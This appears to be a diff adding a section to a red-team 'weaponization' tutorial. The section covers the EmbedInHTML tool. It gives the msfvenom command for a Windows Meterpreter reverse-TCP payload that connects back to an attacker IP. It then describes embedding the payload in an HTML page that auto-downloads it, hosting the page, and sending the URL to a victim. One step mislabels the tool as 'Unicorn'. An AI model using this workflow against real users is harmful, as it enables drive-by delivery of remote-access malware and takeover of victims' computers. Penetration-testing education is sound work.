@@ -43,3 +43,35 @@ Once the PowerShell code will be executed in the victim’s powershell command p
 <kbd>![](Weaponization/6.png)</kbd>
 
 For more use cases, you can use ```python unicorn.py --help``` command or you can visit this [URL](https://github.com/trustedsec/unicorn).
+
+
+## EmbedInHTML
+
+EmbedInHTML tool will take a file (any type of file) as input, encrypt it, and embed it into an HTML file as resource, along with an automatic download routine simulating a user clicking on the embedded resource. When the user browses the HTML file, the embedded file is decrypted on the fly, saved in a temporary folder, and the file is then presented to the user as if it was being downloaded from the remote site.
+
+
+### Installation
+
+You can install "Unicorn" using following command:
+
+```
+git clone https://github.com/Arno0x/EmbedInHTML
+```
+
+<kbd>![](Weaponization/7.png)</kbd>
+
+### Usage
+
+Here I am creating a shell.exe file using ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's_IP> LPORT=<Listening_Port> -f exe > shell.exe``` to embed in an HTML page.
+
+<kbd>![](Weaponization/8.png)</kbd>
+
+Use ```python embedInHTML.py -k <Your_Secret_Key> -f <Payload_Filename> -o index.html``` command which will generate the index.html file in output directory. Now you can move the file to your /var/www/html/ directory and send the URL to victim.
+
+<kbd>![](Weaponization/9.png)</kbd>
+
+Whenever victim will visit the URL, your payload will be downloaded into victim's computer.
+
+<kbd>![](Weaponization/10.png)</kbd>
+
+For more use cases, you can use ```python embedInHTML.py help``` command or you can visit this [URL](https://github.com/Arno0x/EmbedInHTML).
